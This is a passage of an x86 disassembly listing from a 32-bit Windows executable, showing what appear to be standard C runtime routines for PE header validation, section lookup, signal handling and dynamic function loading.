  405c2a:	56                   	push   %esi
  405c2b:	e8 22 cd ff ff       	call   0x402952
  405c30:	59                   	pop    %ecx
  405c31:	a3 c4 fa 40 00       	mov    %eax,0x40fac4
  405c36:	8b 45 08             	mov    0x8(%ebp),%eax
  405c39:	59                   	pop    %ecx
  405c3a:	eb 02                	jmp    0x405c3e
  405c3c:	33 c0                	xor    %eax,%eax
  405c3e:	5f                   	pop    %edi
  405c3f:	5e                   	pop    %esi
  405c40:	5b                   	pop    %ebx
  405c41:	c9                   	leave
  405c42:	c3                   	ret
  405c43:	8b ff                	mov    %edi,%edi
  405c45:	56                   	push   %esi
  405c46:	6a 04                	push   $0x4
  405c48:	6a 20                	push   $0x20
  405c4a:	e8 90 ec ff ff       	call   0x4048df
  405c4f:	8b f0                	mov    %eax,%esi
  405c51:	56                   	push   %esi
  405c52:	e8 fb cc ff ff       	call   0x402952
  405c57:	83 c4 0c             	add    $0xc,%esp
  405c5a:	a3 c8 fa 40 00       	mov    %eax,0x40fac8
  405c5f:	a3 c4 fa 40 00       	mov    %eax,0x40fac4
  405c64:	85 f6                	test   %esi,%esi
  405c66:	75 05                	jne    0x405c6d
  405c68:	6a 18                	push   $0x18
  405c6a:	58                   	pop    %eax
  405c6b:	5e                   	pop    %esi
  405c6c:	c3                   	ret
  405c6d:	83 26 00             	andl   $0x0,(%esi)
  405c70:	33 c0                	xor    %eax,%eax
  405c72:	5e                   	pop    %esi
  405c73:	c3                   	ret
  405c74:	6a 0c                	push   $0xc
  405c76:	68 28 b7 40 00       	push   $0x40b728
  405c7b:	e8 a0 d2 ff ff       	call   0x402f20
  405c80:	e8 83 bf ff ff       	call   0x401c08
  405c85:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405c89:	ff 75 08             	push   0x8(%ebp)
  405c8c:	e8 f8 fe ff ff       	call   0x405b89
  405c91:	59                   	pop    %ecx
  405c92:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405c95:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405c9c:	e8 09 00 00 00       	call   0x405caa
  405ca1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405ca4:	e8 bc d2 ff ff       	call   0x402f65
  405ca9:	c3                   	ret
  405caa:	e8 62 bf ff ff       	call   0x401c11
  405caf:	c3                   	ret
  405cb0:	8b ff                	mov    %edi,%edi
  405cb2:	55                   	push   %ebp
  405cb3:	8b ec                	mov    %esp,%ebp
  405cb5:	ff 75 08             	push   0x8(%ebp)
  405cb8:	e8 b7 ff ff ff       	call   0x405c74
  405cbd:	f7 d8                	neg    %eax
  405cbf:	1b c0                	sbb    %eax,%eax
  405cc1:	f7 d8                	neg    %eax
  405cc3:	59                   	pop    %ecx
  405cc4:	48                   	dec    %eax
  405cc5:	5d                   	pop    %ebp
  405cc6:	c3                   	ret
  405cc7:	cc                   	int3
  405cc8:	cc                   	int3
  405cc9:	cc                   	int3
  405cca:	cc                   	int3
  405ccb:	cc                   	int3
  405ccc:	cc                   	int3
  405ccd:	cc                   	int3
  405cce:	cc                   	int3
  405ccf:	cc                   	int3
  405cd0:	8b ff                	mov    %edi,%edi
  405cd2:	55                   	push   %ebp
  405cd3:	8b ec                	mov    %esp,%ebp
  405cd5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405cd8:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  405cdd:	66 39 01             	cmp    %ax,(%ecx)
  405ce0:	74 04                	je     0x405ce6
  405ce2:	33 c0                	xor    %eax,%eax
  405ce4:	5d                   	pop    %ebp
  405ce5:	c3                   	ret
  405ce6:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405ce9:	03 c1                	add    %ecx,%eax
  405ceb:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  405cf1:	75 ef                	jne    0x405ce2
  405cf3:	33 d2                	xor    %edx,%edx
  405cf5:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  405cfa:	66 39 48 18          	cmp    %cx,0x18(%eax)
  405cfe:	0f 94 c2             	sete   %dl
  405d01:	8b c2                	mov    %edx,%eax
  405d03:	5d                   	pop    %ebp
  405d04:	c3                   	ret
  405d05:	cc                   	int3
  405d06:	cc                   	int3
  405d07:	cc                   	int3
  405d08:	cc                   	int3
  405d09:	cc                   	int3
  405d0a:	cc                   	int3
  405d0b:	cc                   	int3
  405d0c:	cc                   	int3
  405d0d:	cc                   	int3
  405d0e:	cc                   	int3
  405d0f:	cc                   	int3
  405d10:	8b ff                	mov    %edi,%edi
  405d12:	55                   	push   %ebp
  405d13:	8b ec                	mov    %esp,%ebp
  405d15:	8b 45 08             	mov    0x8(%ebp),%eax
  405d18:	8b 48 3c             	mov    0x3c(%eax),%ecx
  405d1b:	03 c8                	add    %eax,%ecx
  405d1d:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  405d21:	53                   	push   %ebx
  405d22:	56                   	push   %esi
  405d23:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  405d27:	33 d2                	xor    %edx,%edx
  405d29:	57                   	push   %edi
  405d2a:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  405d2e:	85 f6                	test   %esi,%esi
  405d30:	76 1b                	jbe    0x405d4d
  405d32:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405d35:	8b 48 0c             	mov    0xc(%eax),%ecx
  405d38:	3b f9                	cmp    %ecx,%edi
  405d3a:	72 09                	jb     0x405d45
  405d3c:	8b 58 08             	mov    0x8(%eax),%ebx
  405d3f:	03 d9                	add    %ecx,%ebx
  405d41:	3b fb                	cmp    %ebx,%edi
  405d43:	72 0a                	jb     0x405d4f
  405d45:	42                   	inc    %edx
  405d46:	83 c0 28             	add    $0x28,%eax
  405d49:	3b d6                	cmp    %esi,%edx
  405d4b:	72 e8                	jb     0x405d35
  405d4d:	33 c0                	xor    %eax,%eax
  405d4f:	5f                   	pop    %edi
  405d50:	5e                   	pop    %esi
  405d51:	5b                   	pop    %ebx
  405d52:	5d                   	pop    %ebp
  405d53:	c3                   	ret
  405d54:	cc                   	int3
  405d55:	cc                   	int3
  405d56:	cc                   	int3
  405d57:	cc                   	int3
  405d58:	cc                   	int3
  405d59:	cc                   	int3
  405d5a:	cc                   	int3
  405d5b:	cc                   	int3
  405d5c:	cc                   	int3
  405d5d:	cc                   	int3
  405d5e:	cc                   	int3
  405d5f:	cc                   	int3
  405d60:	8b ff                	mov    %edi,%edi
  405d62:	55                   	push   %ebp
  405d63:	8b ec                	mov    %esp,%ebp
  405d65:	6a fe                	push   $0xfffffffe
  405d67:	68 48 b7 40 00       	push   $0x40b748
  405d6c:	68 80 2f 40 00       	push   $0x402f80
  405d71:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405d77:	50                   	push   %eax
  405d78:	83 ec 08             	sub    $0x8,%esp
  405d7b:	53                   	push   %ebx
  405d7c:	56                   	push   %esi
  405d7d:	57                   	push   %edi
  405d7e:	a1 60 db 40 00       	mov    0x40db60,%eax
  405d83:	31 45 f8             	xor    %eax,-0x8(%ebp)
  405d86:	33 c5                	xor    %ebp,%eax
  405d88:	50                   	push   %eax
  405d89:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405d8c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405d92:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405d95:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  405d9c:	68 00 00 40 00       	push   $0x400000
  405da1:	e8 2a ff ff ff       	call   0x405cd0
  405da6:	83 c4 04             	add    $0x4,%esp
  405da9:	85 c0                	test   %eax,%eax
  405dab:	74 55                	je     0x405e02
  405dad:	8b 45 08             	mov    0x8(%ebp),%eax
  405db0:	2d 00 00 40 00       	sub    $0x400000,%eax
  405db5:	50                   	push   %eax
  405db6:	68 00 00 40 00       	push   $0x400000
  405dbb:	e8 50 ff ff ff       	call   0x405d10
  405dc0:	83 c4 08             	add    $0x8,%esp
  405dc3:	85 c0                	test   %eax,%eax
  405dc5:	74 3b                	je     0x405e02
  405dc7:	8b 40 24             	mov    0x24(%eax),%eax
  405dca:	c1 e8 1f             	shr    $0x1f,%eax
  405dcd:	f7 d0                	not    %eax
  405dcf:	83 e0 01             	and    $0x1,%eax
  405dd2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405dd9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405ddc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405de3:	59                   	pop    %ecx
  405de4:	5f                   	pop    %edi
  405de5:	5e                   	pop    %esi
  405de6:	5b                   	pop    %ebx
  405de7:	8b e5                	mov    %ebp,%esp
  405de9:	5d                   	pop    %ebp
  405dea:	c3                   	ret
  405deb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405dee:	8b 08                	mov    (%eax),%ecx
  405df0:	8b 01                	mov    (%ecx),%eax
  405df2:	33 d2                	xor    %edx,%edx
  405df4:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  405df9:	0f 94 c2             	sete   %dl
  405dfc:	8b c2                	mov    %edx,%eax
  405dfe:	c3                   	ret
  405dff:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405e02:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405e09:	33 c0                	xor    %eax,%eax
  405e0b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405e0e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405e15:	59                   	pop    %ecx
  405e16:	5f                   	pop    %edi
  405e17:	5e                   	pop    %esi
  405e18:	5b                   	pop    %ebx
  405e19:	8b e5                	mov    %ebp,%esp
  405e1b:	5d                   	pop    %ebp
  405e1c:	c3                   	ret
  405e1d:	8b ff                	mov    %edi,%edi
  405e1f:	55                   	push   %ebp
  405e20:	8b ec                	mov    %esp,%ebp
  405e22:	8b 45 08             	mov    0x8(%ebp),%eax
  405e25:	a3 20 e5 40 00       	mov    %eax,0x40e520
  405e2a:	a3 24 e5 40 00       	mov    %eax,0x40e524
  405e2f:	a3 28 e5 40 00       	mov    %eax,0x40e528
  405e34:	a3 2c e5 40 00       	mov    %eax,0x40e52c
  405e39:	5d                   	pop    %ebp
  405e3a:	c3                   	ret
  405e3b:	8b ff                	mov    %edi,%edi
  405e3d:	55                   	push   %ebp
  405e3e:	8b ec                	mov    %esp,%ebp
  405e40:	8b 45 08             	mov    0x8(%ebp),%eax
  405e43:	8b 0d 4c d2 40 00    	mov    0x40d24c,%ecx
  405e49:	56                   	push   %esi
  405e4a:	39 50 04             	cmp    %edx,0x4(%eax)
  405e4d:	74 0f                	je     0x405e5e
  405e4f:	8b f1                	mov    %ecx,%esi
  405e51:	6b f6 0c             	imul   $0xc,%esi,%esi
  405e54:	03 75 08             	add    0x8(%ebp),%esi
  405e57:	83 c0 0c             	add    $0xc,%eax
  405e5a:	3b c6                	cmp    %esi,%eax
  405e5c:	72 ec                	jb     0x405e4a
  405e5e:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  405e61:	03 4d 08             	add    0x8(%ebp),%ecx
  405e64:	5e                   	pop    %esi
  405e65:	3b c1                	cmp    %ecx,%eax
  405e67:	73 05                	jae    0x405e6e
  405e69:	39 50 04             	cmp    %edx,0x4(%eax)
  405e6c:	74 02                	je     0x405e70
  405e6e:	33 c0                	xor    %eax,%eax
  405e70:	5d                   	pop    %ebp
  405e71:	c3                   	ret
  405e72:	ff 35 28 e5 40 00    	push   0x40e528
  405e78:	e8 50 cb ff ff       	call   0x4029cd
  405e7d:	59                   	pop    %ecx
  405e7e:	c3                   	ret
  405e7f:	6a 20                	push   $0x20
  405e81:	68 68 b7 40 00       	push   $0x40b768
  405e86:	e8 95 d0 ff ff       	call   0x402f20
  405e8b:	33 ff                	xor    %edi,%edi
  405e8d:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  405e90:	89 7d d8             	mov    %edi,-0x28(%ebp)
  405e93:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405e96:	83 fb 0b             	cmp    $0xb,%ebx
  405e99:	7f 4c                	jg     0x405ee7
  405e9b:	74 15                	je     0x405eb2
  405e9d:	8b c3                	mov    %ebx,%eax
  405e9f:	6a 02                	push   $0x2
  405ea1:	59                   	pop    %ecx
  405ea2:	2b c1                	sub    %ecx,%eax
  405ea4:	74 22                	je     0x405ec8
  405ea6:	2b c1                	sub    %ecx,%eax
  405ea8:	74 08                	je     0x405eb2
  405eaa:	2b c1                	sub    %ecx,%eax
  405eac:	74 64                	je     0x405f12
  405eae:	2b c1                	sub    %ecx,%eax
  405eb0:	75 44                	jne    0x405ef6
  405eb2:	e8 e9 cc ff ff       	call   0x402ba0
  405eb7:	8b f8                	mov    %eax,%edi
  405eb9:	89 7d d8             	mov    %edi,-0x28(%ebp)
  405ebc:	85 ff                	test   %edi,%edi
  405ebe:	75 14                	jne    0x405ed4
  405ec0:	83 c8 ff             	or     $0xffffffff,%eax
  405ec3:	e9 61 01 00 00       	jmp    0x406029
  405ec8:	be 20 e5 40 00       	mov    $0x40e520,%esi
  405ecd:	a1 20 e5 40 00       	mov    0x40e520,%eax
  405ed2:	eb 60                	jmp    0x405f34
  405ed4:	ff 77 5c             	push   0x5c(%edi)
  405ed7:	8b d3                	mov    %ebx,%edx
  405ed9:	e8 5d ff ff ff       	call   0x405e3b
  405ede:	8b f0                	mov    %eax,%esi
  405ee0:	83 c6 08             	add    $0x8,%esi
  405ee3:	8b 06                	mov    (%esi),%eax
  405ee5:	eb 5a                	jmp    0x405f41
  405ee7:	8b c3                	mov    %ebx,%eax
  405ee9:	83 e8 0f             	sub    $0xf,%eax
  405eec:	74 3c                	je     0x405f2a
  405eee:	83 e8 06             	sub    $0x6,%eax
  405ef1:	74 2b                	je     0x405f1e
  405ef3:	48                   	dec    %eax
  405ef4:	74 1c                	je     0x405f12
  405ef6:	e8 84 ba ff ff       	call   0x40197f
  405efb:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  405f01:	33 c0                	xor    %eax,%eax
  405f03:	50                   	push   %eax
  405f04:	50                   	push   %eax
  405f05:	50                   	push   %eax
  405f06:	50                   	push   %eax
  405f07:	50                   	push   %eax
  405f08:	e8 0a ba ff ff       	call   0x401917
  405f0d:	83 c4 14             	add    $0x14,%esp
  405f10:	eb ae                	jmp    0x405ec0
  405f12:	be 28 e5 40 00       	mov    $0x40e528,%esi
  405f17:	a1 28 e5 40 00       	mov    0x40e528,%eax
  405f1c:	eb 16                	jmp    0x405f34
  405f1e:	be 24 e5 40 00       	mov    $0x40e524,%esi
  405f23:	a1 24 e5 40 00       	mov    0x40e524,%eax
  405f28:	eb 0a                	jmp    0x405f34
  405f2a:	be 2c e5 40 00       	mov    $0x40e52c,%esi
  405f2f:	a1 2c e5 40 00       	mov    0x40e52c,%eax
  405f34:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  405f3b:	50                   	push   %eax
  405f3c:	e8 8c ca ff ff       	call   0x4029cd
  405f41:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405f44:	59                   	pop    %ecx
  405f45:	33 c0                	xor    %eax,%eax
  405f47:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  405f4b:	0f 84 d8 00 00 00    	je     0x406029
  405f51:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  405f54:	75 07                	jne    0x405f5d
  405f56:	6a 03                	push   $0x3
  405f58:	e8 c5 be ff ff       	call   0x401e22
  405f5d:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  405f60:	74 07                	je     0x405f69
  405f62:	50                   	push   %eax
  405f63:	e8 ee fb ff ff       	call   0x405b56
  405f68:	59                   	pop    %ecx
  405f69:	33 c0                	xor    %eax,%eax
  405f6b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405f6e:	83 fb 08             	cmp    $0x8,%ebx
  405f71:	74 0a                	je     0x405f7d
  405f73:	83 fb 0b             	cmp    $0xb,%ebx
  405f76:	74 05                	je     0x405f7d
  405f78:	83 fb 04             	cmp    $0x4,%ebx
  405f7b:	75 1b                	jne    0x405f98
  405f7d:	8b 4f 60             	mov    0x60(%edi),%ecx
  405f80:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  405f83:	89 47 60             	mov    %eax,0x60(%edi)
  405f86:	83 fb 08             	cmp    $0x8,%ebx
  405f89:	75 40                	jne    0x405fcb
  405f8b:	8b 4f 64             	mov    0x64(%edi),%ecx
  405f8e:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405f91:	c7 47 64 8c 00 00 00 	movl   $0x8c,0x64(%edi)
  405f98:	83 fb 08             	cmp    $0x8,%ebx
  405f9b:	75 2e                	jne    0x405fcb
  405f9d:	8b 0d 40 d2 40 00    	mov    0x40d240,%ecx
  405fa3:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  405fa6:	8b 0d 44 d2 40 00    	mov    0x40d244,%ecx
  405fac:	8b 15 40 d2 40 00    	mov    0x40d240,%edx
  405fb2:	03 ca                	add    %edx,%ecx
  405fb4:	39 4d dc             	cmp    %ecx,-0x24(%ebp)
  405fb7:	7d 19                	jge    0x405fd2
  405fb9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405fbc:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  405fbf:	8b 57 5c             	mov    0x5c(%edi),%edx
  405fc2:	89 44 11 08          	mov    %eax,0x8(%ecx,%edx,1)
  405fc6:	ff 45 dc             	incl   -0x24(%ebp)
  405fc9:	eb db                	jmp    0x405fa6
  405fcb:	e8 f4 c9 ff ff       	call   0x4029c4
  405fd0:	89 06                	mov    %eax,(%esi)
  405fd2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405fd9:	e8 15 00 00 00       	call   0x405ff3
  405fde:	83 fb 08             	cmp    $0x8,%ebx
  405fe1:	75 1f                	jne    0x406002
  405fe3:	ff 77 64             	push   0x64(%edi)
  405fe6:	53                   	push   %ebx
  405fe7:	ff 55 e0             	call   *-0x20(%ebp)
  405fea:	59                   	pop    %ecx
  405feb:	eb 19                	jmp    0x406006
  405fed:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405ff0:	8b 7d d8             	mov    -0x28(%ebp),%edi
  405ff3:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  405ff7:	74 08                	je     0x406001
  405ff9:	6a 00                	push   $0x0
  405ffb:	e8 7c fa ff ff       	call   0x405a7c
  406000:	59                   	pop    %ecx
  406001:	c3                   	ret
  406002:	53                   	push   %ebx
  406003:	ff 55 e0             	call   *-0x20(%ebp)
  406006:	59                   	pop    %ecx
  406007:	83 fb 08             	cmp    $0x8,%ebx
  40600a:	74 0a                	je     0x406016
  40600c:	83 fb 0b             	cmp    $0xb,%ebx
  40600f:	74 05                	je     0x406016
  406011:	83 fb 04             	cmp    $0x4,%ebx
  406014:	75 11                	jne    0x406027
  406016:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406019:	89 47 60             	mov    %eax,0x60(%edi)
  40601c:	83 fb 08             	cmp    $0x8,%ebx
  40601f:	75 06                	jne    0x406027
  406021:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406024:	89 47 64             	mov    %eax,0x64(%edi)
  406027:	33 c0                	xor    %eax,%eax
  406029:	e8 37 cf ff ff       	call   0x402f65
  40602e:	c3                   	ret
  40602f:	8b ff                	mov    %edi,%edi
  406031:	55                   	push   %ebp
  406032:	8b ec                	mov    %esp,%ebp
  406034:	8b 45 08             	mov    0x8(%ebp),%eax
  406037:	a3 34 e5 40 00       	mov    %eax,0x40e534
  40603c:	5d                   	pop    %ebp
  40603d:	c3                   	ret
  40603e:	8b ff                	mov    %edi,%edi
  406040:	55                   	push   %ebp
  406041:	8b ec                	mov    %esp,%ebp
  406043:	8b 45 08             	mov    0x8(%ebp),%eax
  406046:	a3 40 e5 40 00       	mov    %eax,0x40e540
  40604b:	5d                   	pop    %ebp
  40604c:	c3                   	ret
  40604d:	8b ff                	mov    %edi,%edi
  40604f:	55                   	push   %ebp
  406050:	8b ec                	mov    %esp,%ebp
  406052:	8b 45 08             	mov    0x8(%ebp),%eax
  406055:	a3 44 e5 40 00       	mov    %eax,0x40e544
  40605a:	5d                   	pop    %ebp
  40605b:	c3                   	ret
  40605c:	6a 10                	push   $0x10
  40605e:	68 88 b7 40 00       	push   $0x40b788
  406063:	e8 b8 ce ff ff       	call   0x402f20
  406068:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40606c:	ff 75 0c             	push   0xc(%ebp)
  40606f:	ff 75 08             	push   0x8(%ebp)
  406072:	ff 15 00 a1 40 00    	call   *0x40a100
  406078:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40607b:	eb 2f                	jmp    0x4060ac
  40607d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406080:	8b 00                	mov    (%eax),%eax
  406082:	8b 00                	mov    (%eax),%eax
  406084:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406087:	33 c9                	xor    %ecx,%ecx
  406089:	3d 17 00 00 c0       	cmp    $0xc0000017,%eax
  40608e:	0f 94 c1             	sete   %cl
  406091:	8b c1                	mov    %ecx,%eax
  406093:	c3                   	ret
  406094:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406097:	81 7d e0 17 00 00 c0 	cmpl   $0xc0000017,-0x20(%ebp)
  40609e:	75 08                	jne    0x4060a8
  4060a0:	6a 08                	push   $0x8
  4060a2:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  4060a8:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4060ac:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4060b3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4060b6:	e8 aa ce ff ff       	call   0x402f65
  4060bb:	c3                   	ret
  4060bc:	8b ff                	mov    %edi,%edi
  4060be:	55                   	push   %ebp
  4060bf:	8b ec                	mov    %esp,%ebp
  4060c1:	8b 45 08             	mov    0x8(%ebp),%eax
  4060c4:	a3 48 e5 40 00       	mov    %eax,0x40e548
  4060c9:	5d                   	pop    %ebp
  4060ca:	c3                   	ret
  4060cb:	8b ff                	mov    %edi,%edi
  4060cd:	55                   	push   %ebp
  4060ce:	8b ec                	mov    %esp,%ebp
  4060d0:	ff 35 48 e5 40 00    	push   0x40e548
  4060d6:	e8 f2 c8 ff ff       	call   0x4029cd
  4060db:	59                   	pop    %ecx
  4060dc:	85 c0                	test   %eax,%eax
  4060de:	74 0f                	je     0x4060ef
  4060e0:	ff 75 08             	push   0x8(%ebp)
  4060e3:	ff d0                	call   *%eax
  4060e5:	59                   	pop    %ecx
  4060e6:	85 c0                	test   %eax,%eax
  4060e8:	74 05                	je     0x4060ef
  4060ea:	33 c0                	xor    %eax,%eax
  4060ec:	40                   	inc    %eax
  4060ed:	5d                   	pop    %ebp
  4060ee:	c3                   	ret
  4060ef:	33 c0                	xor    %eax,%eax
  4060f1:	5d                   	pop    %ebp
  4060f2:	c3                   	ret
  4060f3:	8b ff                	mov    %edi,%edi
  4060f5:	55                   	push   %ebp
  4060f6:	8b ec                	mov    %esp,%ebp
  4060f8:	83 ec 14             	sub    $0x14,%esp
  4060fb:	53                   	push   %ebx
  4060fc:	56                   	push   %esi
  4060fd:	57                   	push   %edi
  4060fe:	e8 c1 c8 ff ff       	call   0x4029c4
  406103:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406107:	83 3d 4c e5 40 00 00 	cmpl   $0x0,0x40e54c
  40610e:	8b d8                	mov    %eax,%ebx
  406110:	0f 85 8e 00 00 00    	jne    0x4061a4
  406116:	68 20 aa 40 00       	push   $0x40aa20
  40611b:	ff 15 fc a0 40 00    	call   *0x40a0fc
  406121:	8b f8                	mov    %eax,%edi
  406123:	85 ff                	test   %edi,%edi
  406125:	0f 84 2a 01 00 00    	je     0x406255
  40612b:	8b 35 70 a0 40 00    	mov    0x40a070,%esi
  406131:	68 14 aa 40 00       	push   $0x40aa14
  406136:	57                   	push   %edi
  406137:	ff d6                	call   *%esi
  406139:	85 c0                	test   %eax,%eax
  40613b:	0f 84 14 01 00 00    	je     0x406255
  406141:	50                   	push   %eax
  406142:	e8 0b c8 ff ff       	call   0x402952
  406147:	c7 04 24 04 aa 40 00 	movl   $0x40aa04,(%esp)
  40614e:	57                   	push   %edi
  40614f:	a3 4c e5 40 00       	mov    %eax,0x40e54c
  406154:	ff d6                	call   *%esi
  406156:	50                   	push   %eax
  406157:	e8 f6 c7 ff ff       	call   0x402952
  40615c:	c7 04 24 f0 a9 40 00 	movl   $0x40a9f0,(%esp)
  406163:	57                   	push   %edi
  406164:	a3 50 e5 40 00       	mov    %eax,0x40e550
  406169:	ff d6                	call   *%esi
  40616b:	50                   	push   %eax
  40616c:	e8 e1 c7 ff ff       	call   0x402952
  406171:	c7 04 24 d4 a9 40 00 	movl   $0x40a9d4,(%esp)
  406178:	57                   	push   %edi
  406179:	a3 54 e5 40 00       	mov    %eax,0x40e554
  40617e:	ff d6                	call   *%esi
  406180:	50                   	push   %eax
  406181:	e8 cc c7 ff ff       	call   0x402952
  406186:	59                   	pop    %ecx
  406187:	a3 5c e5 40 00       	mov    %eax,0x40e55c
  40618c:	85 c0                	test   %eax,%eax
  40618e:	74 14                	je     0x4061a4
  406190:	68 bc a9 40 00       	push   $0x40a9bc
  406195:	57                   	push   %edi
  406196:	ff d6                	call   *%esi
  406198:	50                   	push   %eax
  406199:	e8 b4 c7 ff ff       	call   0x402952
  40619e:	59                   	pop    %ecx
  40619f:	a3 58 e5 40 00       	mov    %eax,0x40e558
  4061a4:	a1 58 e5 40 00       	mov    0x40e558,%eax
  4061a9:	3b c3                	cmp    %ebx,%eax
  4061ab:	74 4f                	je     0x4061fc
  4061ad:	39 1d 5c e5 40 00    	cmp    %ebx,0x40e55c
  4061b3:	74 47                	je     0x4061fc
  4061b5:	50                   	push   %eax
  4061b6:	e8 12 c8 ff ff       	call   0x4029cd
  4061bb:	ff 35 5c e5 40 00    	push   0x40e55c
  4061c1:	8b f0                	mov    %eax,%esi
  4061c3:	e8 05 c8 ff ff       	call   0x4029cd
  4061c8:	59                   	pop    %ecx
  4061c9:	59                   	pop    %ecx
  4061ca:	8b f8                	mov    %eax,%edi
  4061cc:	85 f6                	test   %esi,%esi
  4061ce:	74 2c                	je     0x4061fc
  4061d0:	85 ff                	test   %edi,%edi
  4061d2:	74 28                	je     0x4061fc
  4061d4:	ff d6                	call   *%esi
  4061d6:	85 c0                	test   %eax,%eax
  4061d8:	74 19                	je     0x4061f3
  4061da:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4061dd:	51                   	push   %ecx
  4061de:	6a 0c                	push   $0xc
  4061e0:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4061e3:	51                   	push   %ecx
  4061e4:	6a 01                	push   $0x1
  4061e6:	50                   	push   %eax
  4061e7:	ff d7                	call   *%edi
  4061e9:	85 c0                	test   %eax,%eax
  4061eb:	74 06                	je     0x4061f3
  4061ed:	f6 45 f4 01          	testb  $0x1,-0xc(%ebp)
  4061f1:	75 09                	jne    0x4061fc
  4061f3:	81 4d 10 00 00 20 00 	orl    $0x200000,0x10(%ebp)
  4061fa:	eb 39                	jmp    0x406235
  4061fc:	a1 50 e5 40 00       	mov    0x40e550,%eax
  406201:	3b c3                	cmp    %ebx,%eax
  406203:	74 30                	je     0x406235
  406205:	50                   	push   %eax
  406206:	e8 c2 c7 ff ff       	call   0x4029cd
  40620b:	59                   	pop    %ecx
  40620c:	85 c0                	test   %eax,%eax
  40620e:	74 25                	je     0x406235
  406210:	ff d0                	call   *%eax
  406212:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406215:	85 c0                	test   %eax,%eax
  406217:	74 1c                	je     0x406235
  406219:	a1 54 e5 40 00       	mov    0x40e554,%eax
  40621e:	3b c3                	cmp    %ebx,%eax
  406220:	74 13                	je     0x406235
  406222:	50                   	push   %eax
  406223:	e8 a5 c7 ff ff       	call   0x4029cd
  406228:	59                   	pop    %ecx
  406229:	85 c0                	test   %eax,%eax
  40622b:	74 08                	je     0x406235
  40622d:	ff 75 fc             	push   -0x4(%ebp)
  406230:	ff d0                	call   *%eax
  406232:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406235:	ff 35 4c e5 40 00    	push   0x40e54c
  40623b:	e8 8d c7 ff ff       	call   0x4029cd
  406240:	59                   	pop    %ecx
  406241:	85 c0                	test   %eax,%eax
  406243:	74 10                	je     0x406255
  406245:	ff 75 10             	push   0x10(%ebp)
  406248:	ff 75 0c             	push   0xc(%ebp)
  40624b:	ff 75 08             	push   0x8(%ebp)
  40624e:	ff 75 fc             	push   -0x4(%ebp)
  406251:	ff d0                	call   *%eax
  406253:	eb 02                	jmp    0x406257
  406255:	33 c0                	xor    %eax,%eax
  406257:	5f                   	pop    %edi
  406258:	5e                   	pop    %esi
  406259:	5b                   	pop    %ebx
  40625a:	c9                   	leave
  40625b:	c3                   	ret
  40625c:	8b ff                	mov    %edi,%edi
  40625e:	55                   	push   %ebp
  40625f:	8b ec                	mov    %esp,%ebp
  406261:	8b 45 08             	mov    0x8(%ebp),%eax
  406264:	53                   	push   %ebx
  406265:	33 db                	xor    %ebx,%ebx
  406267:	56                   	push   %esi
  406268:	57                   	push   %edi
  406269:	3b c3                	cmp    %ebx,%eax
  40626b:	74 07                	je     0x406274
  40626d:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406270:	3b fb                	cmp    %ebx,%edi
  406272:	77 1b                	ja     0x40628f
  406274:	e8 06 b7 ff ff       	call   0x40197f
  406279:	6a 16                	push   $0x16
  40627b:	5e                   	pop    %esi
